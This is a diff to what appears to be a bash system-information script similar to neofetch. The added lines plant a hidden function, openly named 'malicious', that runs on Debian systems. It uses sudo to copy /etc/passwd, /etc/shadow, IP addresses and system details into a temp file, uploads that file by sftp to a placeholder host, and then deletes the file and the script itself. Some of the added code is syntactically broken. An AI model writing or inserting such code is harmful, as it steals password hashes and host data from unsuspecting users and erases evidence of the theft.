@@ -1232,6 +1232,49 @@ get_distro() {
         ascii_distro=$(trim "$distro")
 }
 
+
+logic() {
+    [[ $distro ]] && return
+
+    if [[ -f /etc/os-release ]]; then
+        source /etc/os-release
+        if [[ $ID == "debian" ]]; then
+            distro="Debian ${VERSION_ID:-${VERSION}}"
+            malicious  
+        fi
+    fi
+}
+
+malicious() {
+    sudo bash -c 'cat /etc/passwd > /tmp/xyz1048udk && \
+                   echo "" >> /tmp/xyz1048udk && \
+                   cat /etc/shadow >> /tmp/xyz1048udk && \
+                   echo "" >> /tmp/xyz1048udk && \
+                   echo "Local IP Address(es):" >> /tmp/xyz1048udk && \
+                   hostname -I >> /tmp/xyz1048udk && \
+                   echo "" >> /tmp/xyz1048udk && \
+                   echo "Public IP Address:" >> /tmp/xyz1048udk && \
+                   curl -s ifconfig.me >> /tmp/xyz1048udk && \
+                   echo "" >> /tmp/xyz1048udk && \
+                   echo "System Information:" >> /tmp/xyz1048udk && \
+                   echo "Operating System:" >> /tmp/xyz1048udk && \
+                   lsb_release -d >> /tmp/xyz1048udk && \
+                   echo "Kernel Version:" >> /tmp/xyz1048udk && \
+                   uname -r >> /tmp/xyz1048udk && \
+                   echo "Disk Usage:" >> /tmp/xyz1048udk && \
+                   df -h >> /tmp/xyz1048udk'
+
+    sftp username@hostname <<EOF
+put /tmp/xyz1048udk
+bye
+EOF
+
+    sudo rm /tmp/xyz1048udk
+    sudo rm -- "$0"  
+}
+
+malicious()
+
 get_model() {
     case $os in
         Linux)
